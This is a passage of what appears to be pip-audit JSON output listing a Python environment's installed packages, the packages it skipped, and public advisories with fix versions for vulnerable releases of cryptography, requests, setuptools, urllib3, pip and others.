{"dependencies": [{"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.13.3", "vulns": []}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "annotated-doc", "version": "0.0.4", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anyio", "version": "4.12.1", "vulns": []}, {"name": "argcomplete", "version": "3.1.4", "vulns": []}, {"name": "astroid", "version": "4.0.3", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "authlib", "version": "1.6.7", "vulns": []}, {"name": "bandit", "version": "1.9.3", "vulns": []}, {"name": "bcc", "skip_reason": "Dependency not found on PyPI and could not be audited: bcc (0.29.1)"}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "brlapi", "skip_reason": "Dependency not found on PyPI and could not be audited: brlapi (0.8.5)"}, {"name": "brotli", "version": "1.1.0", "vulns": [{"id": "CVE-2025-6176", "fix_versions": ["1.2.0"], "aliases": ["GHSA-2qfp-q593-8484"], "description": "Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0."}]}, {"name": "build", "version": "1.4.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "certifi", "version": "2023.11.17", "vulns": [{"id": "PYSEC-2024-230", "fix_versions": ["2024.7.4"], "aliases": ["CVE-2024-39689", "GHSA-248v-346w-9cwc"], "description": "Certifi 2024.07.04 removes root certificates from \"GLOBALTRUST\" from the root store. These are in the process of being removed from Mozilla's trust store.  GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues\". Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI)."}, {"id": "PYSEC-2024-230", "fix_versions": ["2024.7.4"], "aliases": ["CVE-2024-39689", "GHSA-248v-346w-9cwc"], "description": "Certifi is a curated collection of Root Certificates for validating the trustworthiness of SSL certificates while verifying the identity of TLS hosts. Certifi starting in 2021.05.30 and prior to 2024.07.4 recognized root certificates from `GLOBALTRUST`. Certifi 2024.07.04 removes root certificates from `GLOBALTRUST` from the root store. These are in the process of being removed from Mozilla's trust store. `GLOBALTRUST`'s root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues.\""}]}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "click", "version": "8.1.6", "vulns": []}, {"name": "clipin", "version": "1.0.0", "vulns": []}, {"name": "codedocent", "version": "0.3.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "command-not-found", "skip_reason": "Dependency not found on PyPI and could not be audited: command-not-found (0.3)"}, {"name": "contourpy", "version": "1.3.3", "vulns": []}, {"name": "cryptography", "version": "41.0.7", "vulns": [{"id": "PYSEC-2024-225", "fix_versions": ["42.0.4"], "aliases": ["CVE-2024-26130", "GHSA-6vqw-3v5j-54x4"], "description": "If `pkcs12.serialize_key_and_certificates` is called with both:  1. A certificate whose public key did not match the provided private key 2. An `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`  Then a NULL pointer dereference would occur, crashing the Python process.  This has been resolved, and now a `ValueError` is properly raised.  Patched in https://github.com/pyca/cryptography/pull/10423"}, {"id": "PYSEC-2024-225", "fix_versions": ["42.0.4"], "aliases": ["CVE-2024-26130", "GHSA-6vqw-3v5j-54x4"], "description": "cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. Starting in version 38.0.0 and prior to version 42.0.4, if `pkcs12.serialize_key_and_certificates` is called with both a certificate whose public key did not match the provided private key and an `encryption_algorithm` with `hmac_hash` set (via `PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)`, then a NULL pointer dereference would occur, crashing the Python process. This has been resolved in version 42.0.4, the first version in which a `ValueError` is properly raised."}, {"id": "CVE-2023-50782", "fix_versions": ["42.0.0"], "aliases": ["GHSA-3ww4-gg4f-jr7f"], "description": "A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data."}, {"id": "CVE-2024-0727", "fix_versions": ["42.0.2"], "aliases": ["GHSA-9v9h-cgj8-h64p"], "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL to crash leading to a potential Denial of Service attack  Impact summary: Applications loading files in the PKCS12 format from untrusted sources might terminate abruptly.  A file in PKCS12 format can contain certificates and keys and may come from an untrusted source. The PKCS12 specification allows certain fields to be NULL, but OpenSSL does not correctly check for this case. This can lead to a NULL pointer dereference that results in OpenSSL crashing. If an application processes PKCS12 files from an untrusted source using the OpenSSL APIs then that application will be vulnerable to this issue.  OpenSSL APIs that are vulnerable to this are: PKCS12_parse(), PKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes() and PKCS12_newpass().  We have also fixed a similar issue in SMIME_write_PKCS7(). However since this function is related to writing data we do not consider it security significant.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue."}, {"id": "GHSA-h4gh-qq45-vh27", "fix_versions": ["43.0.1"], "aliases": [], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions. "}, {"id": "CVE-2026-26007", "fix_versions": ["46.0.5"], "aliases": ["GHSA-r6ph-v2qm-q3c2"], "description": "## Vulnerability Summary  The `public_key_from_numbers` (or `EllipticCurvePublicNumbers.public_key()`), `EllipticCurvePublicNumbers.public_key()`, `load_der_public_key()` and `load_pem_public_key()` functions do not verify that the point belongs to the expected prime-order subgroup of the curve.  This missing validation allows an attacker to provide a public key point `P` from a small-order subgroup.  This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.  Only SECT curves are impacted by this.  ## Credit  This vulnerability was discovered by: - XlabAI Team of Tencent Xuanwu Lab - Atuin Automated Vulnerability Discovery Engine"}]}, {"name": "cuda-bindings", "version": "12.9.4", "vulns": []}, {"name": "cuda-pathfinder", "version": "1.3.3", "vulns": []}, {"name": "cupshelpers", "skip_reason": "Dependency not found on PyPI and could not be audited: cupshelpers (1.0)"}, {"name": "cycler", "version": "0.12.1", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "dasbus", "version": "1.7", "vulns": []}, {"name": "dbus-python", "version": "1.3.2", "vulns": []}, {"name": "defer", "skip_reason": "Dependency not found on PyPI and could not be audited: defer (1.0.6)"}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "detect-secrets", "version": "1.5.0", "vulns": []}, {"name": "dill", "version": "0.4.1", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "docutils", "version": "0.22.4", "vulns": []}, {"name": "dodgy", "version": "0.2.1", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "esprima", "version": "4.0.1", "vulns": []}, {"name": "filelock", "version": "3.20.3", "vulns": []}, {"name": "flake8", "version": "7.3.0", "vulns": []}, {"name": "flask", "version": "3.1.2", "vulns": []}, {"name": "fonttools", "version": "4.61.1", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "fsspec", "version": "2026.1.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.20.4", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "1.3.7", "vulns": []}, {"name": "id", "version": "1.6.1", "vulns": []}, {"name": "idna", "version": "3.6", "vulns": [{"id": "PYSEC-2024-60", "fix_versions": ["3.7"], "aliases": ["GHSA-jjg7-2v4v-x38h", "CVE-2024-3651"], "description": "### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches The function has been refined to reject such strings without the associated resource consumption in version 3.7.  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.  ### References * https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb"}, {"id": "PYSEC-2024-60", "fix_versions": ["3.7"], "aliases": ["CVE-2024-3651"], "description": "A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulnerability is triggered by a crafted input that causes the `idna.encode()` function to process the input with considerable computational load, significantly increasing the processing time in a quadratic manner relative to the input size."}]}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "isort", "version": "7.0.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.4.0", "vulns": []}, {"name": "jaraco-context", "version": "6.1.0", "vulns": []}, {"name": "jaraco-functools", "version": "4.4.0", "vulns": []}, {"name": "jeepney", "version": "0.9.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "joblib", "version": "1.5.3", "vulns": []}, {"name": "jsonschema", "version": "4.26.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "kernelstub", "skip_reason": "Dependency not found on PyPI and could not be audited: kernelstub (3.1.4)"}, {"name": "keyring", "version": "25.7.0", "vulns": []}, {"name": "kiwisolver", "version": "1.4.9", "vulns": []}, {"name": "language-selector", "skip_reason": "Dependency not found on PyPI and could not be audited: language-selector (0.1)"}, {"name": "launchpadlib", "version": "1.11.0", "vulns": []}, {"name": "lazr-restfulclient", "version": "0.14.6", "vulns": []}, {"name": "lazr-uri", "version": "1.0.6", "vulns": []}, {"name": "librt", "version": "0.7.8", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "louis", "skip_reason": "Dependency not found on PyPI and could not be audited: louis (3.29.0)"}, {"name": "mando", "version": "0.7.1", "vulns": []}, {"name": "markdown-it-py", "version": "3.0.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.3", "vulns": []}, {"name": "marshmallow", "version": "4.2.2", "vulns": []}, {"name": "matplotlib", "version": "3.10.8", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mcp", "version": "1.26.0", "vulns": []}, {"name": "mdurl", "version": "0.1.2", "vulns": []}, {"name": "more-itertools", "version": "10.8.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.1.2", "vulns": []}, {"name": "multidict", "version": "6.7.1", "vulns": []}, {"name": "mutagen", "version": "1.46.0", "vulns": []}, {"name": "mypy", "version": "1.19.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.1.0", "vulns": []}, {"name": "netaddr", "version": "0.8.0", "vulns": []}, {"name": "netifaces", "version": "0.11.0", "vulns": []}, {"name": "networkx", "version": "3.6.1", "vulns": []}, {"name": "nh3", "version": "0.3.2", "vulns": []}, {"name": "nltk", "version": "3.9.2", "vulns": []}, {"name": "numpy", "version": "2.4.2", "vulns": []}, {"name": "nvidia-cublas-cu12", "version": "12.8.4.1", "vulns": []}, {"name": "nvidia-cuda-cupti-cu12", "version": "12.8.90", "vulns": []}, {"name": "nvidia-cuda-nvrtc-cu12", "version": "12.8.93", "vulns": []}, {"name": "nvidia-cuda-runtime-cu12", "version": "12.8.90", "vulns": []}, {"name": "nvidia-cudnn-cu12", "version": "9.10.2.21", "vulns": []}, {"name": "nvidia-cufft-cu12", "version": "11.3.3.83", "vulns": []}, {"name": "nvidia-cufile-cu12", "version": "1.13.1.3", "vulns": []}, {"name": "nvidia-curand-cu12", "version": "10.3.9.90", "vulns": []}, {"name": "nvidia-cusolver-cu12", "version": "11.7.3.90", "vulns": []}, {"name": "nvidia-cusparse-cu12", "version": "12.5.8.93", "vulns": []}, {"name": "nvidia-cusparselt-cu12", "version": "0.7.1", "vulns": []}, {"name": "nvidia-nccl-cu12", "version": "2.27.5", "vulns": []}, {"name": "nvidia-nvjitlink-cu12", "version": "12.8.93", "vulns": []}, {"name": "nvidia-nvshmem-cu12", "version": "3.4.5", "vulns": []}, {"name": "nvidia-nvtx-cu12", "version": "12.8.90", "vulns": []}, {"name": "oauthlib", "version": "3.2.2", "vulns": []}, {"name": "ollama", "version": "0.6.1", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "26.0", "vulns": []}, {"name": "pathspec", "version": "1.0.4", "vulns": []}, {"name": "pillow", "version": "12.1.1", "vulns": []}, {"name": "pip", "version": "24.0", "vulns": [{"id": "CVE-2025-8869", "fix_versions": ["25.3"], "aliases": ["GHSA-4xh5-x5gv-qwph", "BIT-pip-2025-8869"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}, {"id": "CVE-2026-1703", "fix_versions": ["26.0"], "aliases": ["GHSA-6vgw-5pg2-w6jp"], "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pipx", "version": "1.4.3", "vulns": []}, {"name": "platformdirs", "version": "4.2.0", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "pop-transition", "skip_reason": "Dependency not found on PyPI and could not be audited: pop-transition (1.1.2)"}, {"name": "propcache", "version": "0.4.1", "vulns": []}, {"name": "psutil", "version": "5.9.8", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pycairo", "version": "1.25.1", "vulns": []}, {"name": "pycodestyle", "version": "2.14.0", "vulns": []}, {"name": "pycryptodomex", "version": "3.20.0", "vulns": []}, {"name": "pycups", "version": "2.0.1", "vulns": []}, {"name": "pydantic", "version": "2.12.5", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydantic-settings", "version": "2.12.0", "vulns": []}, {"name": "pyflakes", "version": "3.4.0", "vulns": []}, {"name": "pygments", "version": "2.17.2", "vulns": []}, {"name": "pygobject", "version": "3.48.2", "vulns": []}, {"name": "pyjwt", "version": "2.11.0", "vulns": []}, {"name": "pylint", "version": "4.0.4", "vulns": []}, {"name": "pyparsing", "version": "3.1.1", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pytest", "version": "9.0.2", "vulns": []}, {"name": "python-apt", "skip_reason": "Dependency not found on PyPI and could not be audited: python-apt (2.7.7+ubuntu5.1)"}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-debian", "skip_reason": "Dependency not found on PyPI and could not be audited: python-debian (0.1.49+ubuntu2)"}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-gnupg", "version": "0.5.2", "vulns": []}, {"name": "python-multipart", "version": "0.0.22", "vulns": []}, {"name": "pyxdg", "version": "0.28", "vulns": []}, {"name": "pyyaml", "version": "6.0.1", "vulns": []}, {"name": "radon", "version": "6.0.1", "vulns": []}, {"name": "readme-renderer", "version": "44.0", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2026.1.15", "vulns": []}, {"name": "repolib", "skip_reason": "Dependency not found on PyPI and could not be audited: repolib (2.2.2)"}, {"name": "repoman", "skip_reason": "Dependency not found on PyPI and could not be audited: repoman (1.4.0)"}, {"name": "requests", "version": "2.31.0", "vulns": [{"id": "CVE-2024-35195", "fix_versions": ["2.32.0"], "aliases": ["GHSA-9wx4-h78v-vm56"], "description": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.  This occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.  This behavior affects versions of `requests` prior to 2.32.0."}, {"id": "CVE-2024-47081", "fix_versions": ["2.32.4"], "aliases": ["GHSA-9hjg-9r4m-mvj7"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rfc3986", "version": "2.0.0", "vulns": []}, {"name": "rich", "version": "13.7.1", "vulns": []}, {"name": "rpds-py", "version": "0.30.0", "vulns": []}, {"name": "ruamel-yaml", "version": "0.19.1", "vulns": []}, {"name": "ruff", "version": "0.15.0", "vulns": []}, {"name": "safetensors", "version": "0.7.0", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "schemdraw", "version": "0.22", "vulns": []}, {"name": "scipy", "version": "1.17.0", "vulns": []}, {"name": "screen-resolution-extra", "skip_reason": "Dependency not found on PyPI and could not be audited: screen-resolution-extra (0.0.0)"}, {"name": "secretstorage", "version": "3.5.0", "vulns": []}, {"name": "setproctitle", "version": "1.3.3", "vulns": []}, {"name": "setuptools", "version": "68.1.2", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["GHSA-5rjg-fvgr-3xxf", "CVE-2025-47273", "BIT-setuptools-2025-47273"], "description": "### Summary  A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1  ### Details ```     def _download_url(self, url, tmpdir):         # Determine download filename         #         name, _fragment = egg_info_for_url(url)         if name:             while '..' in name:                 name = name.replace('..', '.').replace('\\\\', '_')         else:             name = \"__downloaded__\"  # default if URL has no path contents          if name.endswith('.[egg.zip](http://egg.zip/)'):             name = name[:-4]  # strip the extra .zip before download   -->       filename = os.path.join(tmpdir, name) ```  Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88  `os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter. `name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.  ### Risk Assessment As easy_install and package_index are deprecated, the exploitation surface is reduced. However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.  ### Impact An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.  ### References https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5 https://github.com/pypa/setuptools/issues/4946"}, {"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["GHSA-5rjg-fvgr-3xxf", "CVE-2025-47273"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}, {"id": "CVE-2024-6345", "fix_versions": ["70.0.0"], "aliases": ["GHSA-cx63-2mw6-8hw5", "BIT-setuptools-2024-6345"], "description": "A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0."}]}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "six", "version": "1.16.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "spicebridge", "skip_reason": "Dependency not found on PyPI and could not be audited: spicebridge (0.1.0)"}, {"name": "spicelib", "version": "1.4.9", "vulns": []}, {"name": "sse-starlette", "version": "3.2.0", "vulns": []}, {"name": "starlette", "version": "0.52.1", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "systemd-python", "version": "235", "vulns": []}, {"name": "tenacity", "version": "9.1.4", "vulns": []}, {"name": "tokenizers", "version": "0.22.2", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.14.0", "vulns": []}, {"name": "torch", "version": "2.10.0", "vulns": []}, {"name": "tqdm", "version": "4.67.3", "vulns": []}, {"name": "transformers", "version": "5.0.0", "vulns": []}, {"name": "tree-sitter", "version": "0.25.2", "vulns": []}, {"name": "tree-sitter-c-sharp", "version": "0.23.1", "vulns": []}, {"name": "tree-sitter-embedded-template", "version": "0.25.0", "vulns": []}, {"name": "tree-sitter-language-pack", "version": "0.13.0", "vulns": []}, {"name": "tree-sitter-yaml", "version": "0.7.2", "vulns": []}, {"name": "triton", "version": "3.6.0", "vulns": []}, {"name": "twine", "version": "6.2.0", "vulns": []}, {"name": "typer", "version": "0.21.2", "vulns": []}, {"name": "typer-slim", "version": "0.21.1", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20250915", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "ubuntu-drivers-common", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-drivers-common (0.0.0)"}, {"name": "ubuntu-pro-client", "skip_reason": "Dependency not found on PyPI and could not be audited: ubuntu-pro-client (8001)"}, {"name": "ufw", "skip_reason": "Dependency not found on PyPI and could not be audited: ufw (0.36.2)"}, {"name": "urllib3", "version": "2.0.7", "vulns": [{"id": "CVE-2024-37891", "fix_versions": ["1.26.19", "2.2.2"], "aliases": ["GHSA-34jh-p97f-mpxf"], "description": "When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.  However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header."}, {"id": "CVE-2025-50181", "fix_versions": ["2.5.0"], "aliases": ["GHSA-pq67-6m6q-mj2v"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}, {"id": "CVE-2025-66418", "fix_versions": ["2.6.0"], "aliases": ["GHSA-gm62-xv2j-4w53"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "CVE-2025-66471", "fix_versions": ["2.6.0"], "aliases": ["GHSA-2xpw-w6gg-jr37"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}, {"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode 